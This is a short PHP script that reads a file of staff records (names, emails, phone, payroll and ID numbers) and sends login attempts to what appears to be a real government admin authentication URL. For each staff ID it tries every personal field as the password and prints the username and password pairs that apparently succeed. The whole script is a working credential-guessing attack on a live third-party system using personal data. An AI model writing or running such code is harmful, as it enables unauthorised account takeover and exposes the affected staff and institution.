<?php
include './includes/core.php';

$file = realpath('./database/staff.json');

$data = json_decode(file_get_contents($file), true);

//echo json_encode($data); die();

$dataLine = $data['JSONdata'];
$postLines = ['staff_id', 'first_name', 'last_name', 'password', 'email', 'username', 'mobile_number', 'payroll_no', 'id_number', 'other_names', 'middle_name'];
$url = 'https://edev.nairobiservices.go.ke/api/admin/authentication/auth/login';
foreach ($dataLine as $row) {
    $dtId = (int)$row['id'];
    if ($dtId >= 1479) {
        $username = $row['staff_id'];
        foreach ($postLines as $row2) {
            $postData = ['username' => $username, 'password' => $row[$row2]];
            $dt1 = httpPost($url, $postData, []);
            $dt2 = json_decode($dt1, true);
            if (isset($dt2['message'])) {
                echo $username . ' - ' . $row[$row2] . PHP_EOL;
            }
            //echo $row[$row2];
            //die();
        }
    }
}
